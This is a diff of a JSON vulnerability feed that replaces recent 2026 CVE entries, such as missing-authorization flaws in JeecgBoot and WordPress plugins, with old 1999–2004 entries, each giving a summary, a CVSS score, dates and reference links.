+        "http://archives.neohapsis.com/archives/vulnwatch/2002-q3/0036.html",
+        "http://online.securityfocus.com/archive/1/283999",
+        "http://www.iss.net/security_center/static/9655.php",
+        "http://www.securityfocus.com/bid/5292",
+        "http://archives.neohapsis.com/archives/vulnwatch/2002-q3/0036.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-108628",
-      "summary": "JeecgBoot through 3.9.5 contains a missing authorization vulnerability in the saveDeptRolePermission endpoint of SysDepartPermissionController that allows any authenticated user to modify department role permissions. Low-privileged attackers can submit roleId and permissionIds values to grant arbitrary menu or button permissions, escalating privileges or revoking other users' permissions.",
-      "cvssScore": 4.2,
-      "severity": "Medium",
-      "published": "2026-10-11",
-      "modified": "2026-10-11",
+      "id": "CVE-2002-1073",
+      "summary": "Buffer overflow in the control service for MERCUR Mailserver 4.2 allows remote attackers to execute arbitrary code via a long password.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-10-04",
+      "modified": null,
       "cwe": null,
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-108628",
-        "https://github.com/AnkesKasty/cve-request-poc/blob/a7b6d1423555812d8efa26c91c5d0683164b31e5/JeecgBoot/poc_dept_role_policy_reads_and_save.py",
-        "https://github.com/jeecgboot/JeecgBoot/blob/e3b9dc0aefe1943d9772b026f64ed671a7c82802/jeecg-boot/jeecg-module-system/jeecg-system-biz/src/main/java/org/jeecg/modules/system/controller/SysDepartPermissionController.java#L252-L271",
-        "https://www.vulncheck.com/advisories/jeecgboot-through-3.9.5-missing-authorization-via-savedeptrolepermission-endpoint"
+        "http://archives.neohapsis.com/archives/bugtraq/2002-07/0195.html",
+        "http://www.iss.net/security_center/static/9618.php",
+        "http://www.securityfocus.com/bid/5261",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-07/0195.html",
+        "http://www.iss.net/security_center/static/9618.php"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-108629",
-      "summary": "JeecgBoot through 3.9.5 contains a missing authorization vulnerability in the saveDatarule handler of SysDepartPermissionController that allows any authenticated user to modify department data rules. Low-privileged attackers can send departId, permissionId and dataRuleIds to POST /sys/sysDepartPermission/datarule to change, add or clear data rules on any department-menu permission binding.",
-      "cvssScore": 4.2,
-      "severity": "Medium",
-      "published": "2026-10-11",
-      "modified": "2026-10-11",
+      "id": "CVE-2002-1075",
+      "summary": "Buffer overflow in Pegasus mail client 4.01 and earlier allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via long (1) To or (2) From headers.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-10-04",
+      "modified": null,
       "cwe": null,
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-108629",
-        "https://github.com/AnkesKasty/cve-request-poc/blob/a7b6d1423555812d8efa26c91c5d0683164b31e5/JeecgBoot/poc_depart_permission_datarule.py",
-        "https://github.com/jeecgboot/JeecgBoot/blob/e3b9dc0aefe1943d9772b026f64ed671a7c82802/jeecg-boot/jeecg-module-system/jeecg-system-biz/src/main/java/org/jeecg/modules/system/controller/SysDepartPermissionController.java#L205-L227",
-        "https://www.vulncheck.com/advisories/jeecgboot-through-3.9.5-missing-authorization-via-sysdepartpermission-datarule-endpoint"
+        "http://archives.neohapsis.com/archives/bugtraq/2002-07/0277.html",
+        "http://www.iss.net/security_center/static/9673.php",
+        "http://www.securityfocus.com/bid/5302",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-07/0277.html",
+        "http://www.iss.net/security_center/static/9673.php"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-108635",
-      "summary": "JeecgBoot through 3.9.5 contains a missing authorization vulnerability in the GET /sys/sysDepart/getDepartmentHead endpoint of SysDepartController that allows any authenticated user to list department staff. Low-privileged attackers can enumerate departId values to retrieve staff names, avatars, posts, and mobile and telephone numbers, including contacts marked hidden.",
-      "cvssScore": 4.2,
-      "severity": "Medium",
-      "published": "2026-10-11",
-      "modified": "2026-10-11",
+      "id": "CVE-2001-1578",
+      "summary": "Unknown vulnerability in SCO OpenServer 5.0.6 and earlier allows local users to modify critical information such as certain CPU registers and segment descriptors.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2001-12-31",
+      "modified": null,
       "cwe": null,
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-108635",
-        "https://github.com/AnkesKasty/cve-request-poc/blob/a7b6d1423555812d8efa26c91c5d0683164b31e5/JeecgBoot/poc_org_scope_reads.py",
-        "https://github.com/jeecgboot/JeecgBoot/blob/e3b9dc0aefe1943d9772b026f64ed671a7c82802/jeecg-boot/jeecg-module-system/jeecg-system-biz/src/main/java/org/jeecg/modules/system/controller/SysDepartController.java#L822-L829",
-        "https://www.vulncheck.com/advisories/jeecgboot-through-3.9.5-missing-authorization-via-getdepartmenthead-endpoint"
+        "http://archives.neohapsis.com/archives/linux/caldera/2001-q4/0014.html",
+        "http://archives.neohapsis.com/archives/linux/caldera/2001-q4/0014.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-108627",
-      "summary": "JeecgBoot through 3.9.5 contains a missing authorization vulnerability in the loadDatarule handler of SysRoleController that lets any authenticated user query role data rules. Low-privileged attackers can request GET /sys/role/datarule/{permissionId}/{roleId} to read rule names, columns, conditions, values and bound rule ids for any role.",
-      "cvssScore": 4.2,
-      "severity": "Medium",
-      "published": "2026-10-11",
-      "modified": "2026-10-11",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-108627",
-        "https://github.com/AnkesKasty/cve-request-poc/blob/a7b6d1423555812d8efa26c91c5d0683164b31e5/JeecgBoot/poc_dept_role_policy_reads_and_save.py",
-        "https://github.com/jeecgboot/JeecgBoot/blob/e3b9dc0aefe1943d9772b026f64ed671a7c82802/jeecg-boot/jeecg-module-system/jeecg-system-biz/src/main/java/org/jeecg/modules/system/controller/SysRoleController.java#L449-L473",
-        "https://www.vulncheck.com/advisories/jeecgboot-through-3.9.5-missing-authorization-via-sys-role-datarule-endpoint"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-1585",
-      "summary": "SSH protocol 2 (aka SSH-2) public key authentication in the development snapshot of OpenSSH 2.3.1, available from 2001-01-18 through 2001-02-08, does not perform a challenge-response step to ensure that the client has the proper private key, which allows remote attackers to bypass authentication as other users by supplying a public key from that user's authorized_keys file.",
-      "cvssScore": 6.8,
+      "id": "CVE-2001-1579",
+      "summary": "The timed program (in.timed) in UnixWare 7 and OpenUnix 8.0.0 does not properly terminate certain strings with a null, which allows remote attackers to cause a denial of service.",
+      "cvssScore": 5,
       "severity": "Medium",
       "published": "2001-12-31",
       "modified": null,
-      "cwe": "CWE-287",
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2001-02/0159.html",
-        "http://online.securityfocus.com/bid/2356",
-        "http://www.openbsd.org/advisories/ssh_bypass.txt",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6084",
-        "http://archives.neohapsis.com/archives/bugtraq/2001-02/0159.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1594",
-      "summary": "Buffer overflow in (1) grpck and (2) pwck, if installed setuid on a system as recommended in some AIX documentation, may allow local users to gain privileges via a long command line argument.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2002-01-02",
-      "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=vuln-dev&m=100999352406822&w=2",
-        "http://marc.info/?l=vulnwatch&m=100998205010794&w=2",
-        "http://publib.boulder.ibm.com/infocenter/pseries/topic/com.ibm.aix.doc/cmds/aixcmds2/grpck.htm",
-        "http://www.kb.cert.org/vuls/id/121891",
-        "http://www.kb.cert.org/vuls/id/877811"
+        "http://archives.neohapsis.com/archives/linux/caldera/2001-q4/0020.html",
+        "http://archives.neohapsis.com/archives/linux/caldera/2001-q4/0020.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-1128",
-      "summary": "Buffer overflow in inc mail utility for Compaq Tru64/OSF1 3.x allows local users to execute arbitrary code via a long MH environment variable.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2002-10-04",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/vulnwatch/2002-q3/0122.html",
-        "http://www.iss.net/security_center/static/10147.php",
-        "http://www.securityfocus.com/bid/5747",
-        "http://archives.neohapsis.com/archives/vulnwatch/2002-q3/0122.html",
-        "http://www.iss.net/security_center/static/10147.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-93630",
-      "summary": "A hostname canonicalization vulnerability in the email HTML sanitizers of Zimbra Collaboration Suite (ZCS) allows an unauthenticated sender to bypass the restriction on forms that target the Zimbra host. DefangFilter and the OWASP ActionAttributePolicy compare the form-action hostname with the request hostname before browser URL canonicalization. A percent-encoded hostname can therefore survive sanitization while the browser submits the form to the normal Zimbra origin with the recipient's authentication cookie. This permits authenticated form requests from a crafted email after the recipient opens it in Classic and submits the form. The issue is present in ZCS 10.1.16 and 10.1.21. It does not bypass an endpoint's CSRF-token checks; a state-changing attack additionally requires an endpoint that accepts the resulting request without that protection.",
-      "cvssScore": 4.2,
+      "id": "CVE-2004-0457",
+      "summary": "The mysqlhotcopy script in mysql 4.0.20 and earlier, when using the scp method from the mysql-server package, allows local users to overwrite arbitrary files via a symlink attack on temporary files.",
+      "cvssScore": 4.6,
       "severity": "Medium",
-      "published": "2026-10-23",
-      "modified": "2026-10-23",
+      "published": "2004-09-28",
+      "modified": null,
       "cwe": null,
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-93630",
-        "https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories",
-        "https://www.rapid7.com/blog/post/ve-breaking-zimbra-identity-boundaries-part-1"
+        "http://packages.debian.org/changelogs/pool/main/m/mysql-dfsg/mysql-dfsg_4.0.20-11/changelog",
+        "http://www.ciac.org/ciac/bulletins/p-018.shtml",
+        "http://www.debian.org/security/2004/dsa-540",
+        "http://www.redhat.com/support/errata/RHSA-2004-597.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/17030"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-0159",
-      "summary": "Heap-based buffer overflow in the NTLMSSP code for Ethereal 0.9.9 and earlier allows remote attackers to cause a denial of service and possibly execute arbitrary code.",
+      "id": "CVE-2002-1881",
+      "summary": "Macromedia Flash Player 4.0 r12 through 6.0.47.0 allows remote attackers to cause a denial of service (web browser crash) via malformed content in a Flash Shockwave (.SWF) file, as demonstrated by by ROT13 encoding the body of the file but not the headers.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2002-08/0088.html",
+        "http://www.iss.net/security_center/static/9843.php",
+        "http://www.securityfocus.com/bid/5445",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-08/0088.html",
+        "http://www.iss.net/security_center/static/9843.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-1171",
+      "summary": "Heap-based buffer overflow in the sec_filter_out function in mod_security 1.7RC1 through 1.7.1 in Apache 2 allows remote attackers to execute arbitrary code via a server side script that sends a large amount of data.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2003-04-02",
+      "published": "2003-12-31",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=104741640924709&w=2",
-        "http://www.ethereal.com/appnotes/enpa-sa-00008.html",
-        "http://www.mandriva.com/security/advisories?name=MDKSA-2003:051",
-        "http://www.novell.com/linux/security/advisories/2003_019_ethereal.html",
-        "http://www.redhat.com/support/errata/RHSA-2003-077.html"
+        "http://adsystems.com.pl/adg-mod_security171.txt",
+        "http://secunia.com/advisories/10085",
+        "http://securitytracker.com/id?1008025",
+        "http://www.modsecurity.org/download/CHANGES",
+        "http://www.securityfocus.com/archive/1/342767"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-67102",
-      "summary": "HCL BigFix Service Management is affected by a high-severity Broken Access Control vulnerability, which could allow a low-privileged user to gain unauthorized access to administrative screens and functions reserved for higher-privileged roles.",
-      "cvssScore": 4.2,
+      "id": "CVE-2003-1172",
+      "summary": "Directory traversal vulnerability in the view-source sample file in Apache Software Foundation Cocoon 2.1 and 2.2 allows remote attackers to access arbitrary files via a .. (dot dot) in the filename parameter.",
+      "cvssScore": 5,
       "severity": "Medium",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
+      "published": "2003-12-31",
+      "modified": null,
       "cwe": null,
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-67102",
-        "https://support.hcl-software.com/csm?id=kb_article&sysparm_article=KB0133782"
+        "http://issues.apache.org/bugzilla/show_bug.cgi?id=23949",
+        "http://secunia.com/advisories/10064",
+        "http://securitytracker.com/id?1007993",
+        "http://www.osvdb.org/2749",
+        "http://www.securiteam.com/securitynews/6W00L0U8KC.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-92714",
-      "summary": "The Download Manager plugin for WordPress is vulnerable to Insecure Direct Object Reference in versions up to, and including, 3.3.68 via the duplicate() function hooked on admin_init. This is due to the handler only verifying the generic 'edit_posts' capability and a plugin-wide static nonce (NONCE_KEY) without any object-level authorization check against the targeted wpdmpro package ID. This makes it possible for authenticated attackers, with Author-level access and above, to duplicate arbitrary Download Manager packages owned by other users (including administrators), which copies all package metadata — including protected file references, role-based access restrictions, and password lock settings — into an attacker-owned clone that they can then edit to remove restrictions and download the previously protected files.",
-      "cvssScore": 4.2,
+      "id": "CVE-2003-1173",
+      "summary": "Centrinity FirstClass 7.1 allows remote attackers to access sensitive information by appending search to the end of the URL and checking all of the search option checkboxes and leaving the text field blank, which will return all files in the searched directory.",
+      "cvssScore": 5,
       "severity": "Medium",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
+      "published": "2003-12-31",
+      "modified": null,
       "cwe": null,
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-92714",
-        "https://plugins.trac.wordpress.org/browser/download-manager/tags/3.3.68/src/Admin/Menu/Packages.php#L132",
-        "https://plugins.trac.wordpress.org/browser/download-manager/tags/3.3.68/src/Admin/Menu/Packages.php#L133",
-        "https://plugins.trac.wordpress.org/browser/download-manager/tags/3.3.68/src/Package/PackageController.php#L2425",
-        "https://plugins.trac.wordpress.org/changeset?reponame=&old=3699609%40download-manager&new=3699609%40download-manager"
+        "http://secunia.com/advisories/10084",
+        "http://www.osvdb.org/2723",
+        "http://www.securityfocus.com/archive/1/342765",
+        "http://www.securityfocus.com/archive/1/342909",
+        "http://www.securityfocus.com/bid/8920"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-14323",
-      "summary": "The Printcart Web to Print Product Designer for WooCommerce plugin for WordPress is vulnerable to Directory Traversal in all versions up to, and including, 2.8.5 via the 'mockups' parameter. This makes it possible for unauthenticated attackers to read the contents of arbitrary files on the server, which can contain sensitive information. A valid nonce is obtainable by unauthenticated users via the companion nbd_check_use_logged_in nopriv AJAX endpoint, which freely mints and returns a nbdesigner-get-data nonce to any visitor; additionally, if the NBDESIGNER_ENABLE_NONCE constant is disabled, even this nonce gate is bypassed entirely.",
+      "id": "CVE-1999-1152",
+      "summary": "Compaq/Microcom 6000 Access Integrator does not disconnect a client after a certain number of failed login attempts, which allows remote attackers to guess usernames or passwords via a brute force attack.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "1998-06-03",
+      "modified": null,
+      "cwe": "CWE-307",
+      "references": [
+        "http://marc.info/?l=bugtraq&m=90296493106214&w=2",
+        "http://marc.info/?l=bugtraq&m=90296493106214&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1150",
+      "summary": "Livingston Portmaster routers running ComOS use the same initial sequence number (ISN) for TCP connections, which allows remote attackers to conduct spoofing and hijack TCP sessions.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "1998-06-30",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/archive/1/9723",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/1882",
+        "http://www.securityfocus.com/archive/1/9723",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/1882"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1574",
+      "summary": "Buffer overflow in the lex routines of nslookup for AIX 4.3 may allow attackers to cause a core dump and possibly execute arbitrary code via \"long input strings.\"",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "1998-07-06",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www-1.ibm.com/support/search.wss?rs=0&q=IX79909&apar=only",
+        "http://www.kb.cert.org/vuls/id/182777",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7867",
+        "http://www-1.ibm.com/support/search.wss?rs=0&q=IX79909&apar=only",
+        "http://www.kb.cert.org/vuls/id/182777"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1437",
+      "summary": "ePerl 2.2.12 allows remote attackers to read arbitrary files and possibly execute certain commands by specifying a full pathname of the target file as an argument to bar.phtml.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "1998-07-07",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=90221104525890&w=2",
+        "http://marc.info/?l=bugtraq&m=90221104525927&w=2",
+        "http://www.securityfocus.com/bid/151",
+        "http://marc.info/?l=bugtraq&m=90221104525890&w=2",
+        "http://marc.info/?l=bugtraq&m=90221104525927&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0120",
+      "summary": "The Remote Access Service invoke.cfm template in Allaire Spectra 1.0 allows users to bypass authentication via the bAuthenticated parameter.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2000-01-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/bid/955",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/4025",
+        "http://www.securityfocus.com/bid/955",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/4025"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0660",
+      "summary": "Buffer overflow in libpng 1.0.12-3.woody.2 and libpng3 1.2.1-1.1.woody.2 on Debian GNU/Linux 3.0, and other operating systems, may allow attackers to cause a denial of service and possibly execute arbitrary code, a different vulnerability than CVE-2002-0728.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-08-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://rhn.redhat.com/errata/RHSA-2002-151.html",
+        "http://rhn.redhat.com/errata/RHSA-2002-152.html",
+        "https://www.debian.org/security/2002/dsa-140",
+        "http://rhn.redhat.com/errata/RHSA-2002-151.html",
+        "http://rhn.redhat.com/errata/RHSA-2002-152.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0661",
+      "summary": "Directory traversal vulnerability in Apache 2.0 through 2.0.39 on Windows, OS2, and Netware allows remote attackers to read arbitrary files and execute commands via .. (dot dot) sequences containing \\ (backslash) characters.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-08-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://httpd.apache.org/info/security_bulletin_20020908a.txt",
+        "http://marc.info/?l=bugtraq&m=102892744011436&w=2",
+        "http://marc.info/?l=bugtraq&m=102951160411052&w=2",
+        "http://www.iss.net/security_center/static/9808.php",
+        "http://www.securityfocus.com/bid/5434"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-1670",
+      "summary": "Multiple directory traversal vulnerabilities Merak Mail Server 7.4.5 with Icewarp Web Mail 5.2.7, and possibly other versions, allow remote attackers to (1) create arbitrary directories via a .. (dot dot) in the user parameter to viewaction.html or (2) rename arbitrary files via a ....// (doubled dot dot) in the folderold or folder parameters to folders.html.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2004-09-10",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=109483971420067&w=2",
+        "http://secunia.com/advisories/12789",
+        "http://www.securityfocus.com/bid/11371",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/17314",
+        "http://marc.info/?l=bugtraq&m=109483971420067&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0064",
+      "summary": "Webconfig, IMAP, and other services in MDaemon 3.5.0 and earlier allows remote attackers to cause a denial of service via a long URL terminated by a \"\\r\\n\" string.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-02-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0315.html",
+        "http://www.securityfocus.com/bid/2134",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0315.html",
+        "http://www.securityfocus.com/bid/2134"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0065",
+      "summary": "Buffer overflow in bftpd 1.0.13 allows remote attackers to cause a denial of service and possibly execute arbitrary commands via a long SITE CHOWN command.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2001-02-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0189.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5775",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-12/0189.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5775"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-1887",
+      "summary": "Ada Image Server (ImgSvr) 0.4 allows remote attackers to view directories or download files via an HTTP request with a trailing %00 (null).",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2004-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=108083813528255&w=2",
+        "http://secunia.com/advisories/11277",
+        "http://sourceforge.net/project/shownotes.php?release_id=230023",
+        "http://www.autistici.org/fdonato/advisory/imgSvr0.4-adv.txt",
+        "http://www.securityfocus.com/bid/10026"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-1888",
+      "summary": "display.cgi in Aborior Encore WebForum allows remote to execute arbitrary commands via shell metacharacters in the file variable.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2004-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=108100973820868&w=2",
+        "http://www.osvdb.org/16831",
+        "http://www.securityfocus.com/archive/1/437813/100/0/threaded",
+        "http://www.securityfocus.com/archive/1/437978/100/0/threaded",
+        "http://www.securityfocus.com/bid/10040"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-1889",
+      "summary": "Unknown vulnerability in ftpd in SGI IRIX 6.5.20 through 6.5.23 allows remote attackers to cause a denial of service (hang) via a link failure with Microsoft Windows.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2004-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://patches.sgi.com/support/free/security/advisories/20040401-01-P.asc",
+        "http://www.securityfocus.com/bid/10037",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/15722",
+        "ftp://patches.sgi.com/support/free/security/advisories/20040401-01-P.asc",
+        "http://www.securityfocus.com/bid/10037"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0547",
+      "summary": "Memory leak in the proxy service in Microsoft Internet Security and Acceleration (ISA) Server 2000 allows local attackers to cause a denial of service (resource exhaustion).",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2001-09-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/bid/3197",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-045",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6990",
+        "http://www.securityfocus.com/bid/3197",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-045"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-104120",
+      "summary": "A security vulnerability has been detected in modelcontextprotocol mcp-server-fetch and mcp-server-everything up to 2026.6.4. Affected is the function fetch_url of the file mcp_server_fetch/server.py of the component Fetch Tool. The manipulation of the argument url/path leads to server-side request forgery. The attack may be initiated remotely. The exploit has been disclosed publicly and may be used. The pull request to fix this issue awaits acceptance.",
+      "cvssScore": 6.4,
+      "severity": "Medium",
+      "published": "2026-10-02",
+      "modified": "2026-10-02",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-104120",
+        "https://github.com/modelcontextprotocol/servers/issues/4492",
+        "https://github.com/modelcontextprotocol/servers/pull/4890",
+        "https://vuldb.com/cve/CVE-2026-104120",
+        "https://vuldb.com/submit/960099"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-2024",
+      "summary": "Horde IMP 2.2.7 allows remote attackers to obtain the full web root pathname via an HTTP request for (1) poppassd.php3, (2) login.php3?reason=chpass2, (3) spelling.php3, and (4) ldap.search.php3?ldap_serv=nonsense which leaks the information in error messages.",
       "cvssScore": 5.3,
       "severity": "Medium",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": null,
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": "CWE-219",
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-14323",
-        "https://plugins.trac.wordpress.org/browser/printcart-integration/tags/2.5.2/includes/class.nbdesigner.php#L213",
-        "https://plugins.trac.wordpress.org/browser/printcart-integration/tags/2.5.2/includes/class.resource.php#L217",
-        "https://plugins.trac.wordpress.org/browser/printcart-integration/tags/2.5.2/includes/class.resource.php#L220",
-        "https://plugins.trac.wordpress.org/browser/printcart-integration/tags/2.5.2/includes/class.resource.php#L27"
+        "http://bugs.horde.org/show_bug.cgi?id=916",
+        "http://www.iss.net/security_center/static/8768.php",
+        "http://www.securityfocus.com/bid/4445",
+        "http://bugs.horde.org/show_bug.cgi?id=916",
+        "http://www.iss.net/security_center/static/8768.php"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-12739",
-      "summary": "The WP Easy Pay – Payment and Donation form Builder for Square plugin for WordPress is vulnerable to authorization bypass in all versions up to, and including, 4.5.0. This is due to the plugin not properly verifying that a user is authorized to perform an action. This makes it possible for authenticated attackers, with subscriber-level access and above, to permanently delete arbitrary posts, pages, and custom post types (bypassing the trash via force deletion) or change any published post to draft status.",
-      "cvssScore": 4.2,
-      "severity": "Medium",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-12739",
-        "https://plugins.trac.wordpress.org/browser/wp-easy-pay/tags/4.5.0/wpep-setup.php#L1658",
-        "https://plugins.trac.wordpress.org/browser/wp-easy-pay/tags/4.5.0/wpep-setup.php#L1663",
-        "https://plugins.trac.wordpress.org/browser/wp-easy-pay/tags/4.5.0/wpep-setup.php#L1695",
-        "https://plugins.trac.wordpress.org/browser/wp-easy-pay/tags/4.5.0/wpep-setup.php#L1703"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1539",
-      "summary": "Buffer overflow in MDaemon POP server 6.0.7 and earlier allows remote authenticated users to cause a denial of service via long (1) DELE or (2) UIDL arguments.",
+      "id": "CVE-2002-2025",
+      "summary": "Lotus Domino server 5.0.9a and earlier allows remote attackers to cause a denial of service by exhausting the number of working threads via a large number of HTTP requests for (1) an MS-DOS device name and (2) an MS-DOS device name with a large number of characters appended to the device name.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2003-03-31",
+      "published": "2002-12-31",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-10/0382.html",
-        "http://www.iss.net/security_center/static/10488.php",
-        "http://www.securityfocus.com/bid/6053",
-        "http://archives.neohapsis.com/archives/bugtraq/2002-10/0382.html",
-        "http://www.iss.net/security_center/static/10488.php"
+        "http://archives.neohapsis.com/archives/vulnwatch/2002-q1/0037.html",
+        "http://www-10.lotus.com/ldd/r5fixlist.nsf/5c087391999d06e7852569280062619d/945e97608fda942a85256b37007905b1?OpenDocument&Highlight=0%2CJCHN547JWV",
+        "http://www-10.lotus.com/ldd/r5fixlist.nsf/5c087391999d06e7852569280062619d/a77f8a5132cce70085256b8000792112?OpenDocument&Highlight=0%2CJCHN4UMKLA",
+        "http://www.securityfocus.com/archive/1/253830",
+        "http://www.securityfocus.com/bid/4019"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-1540",
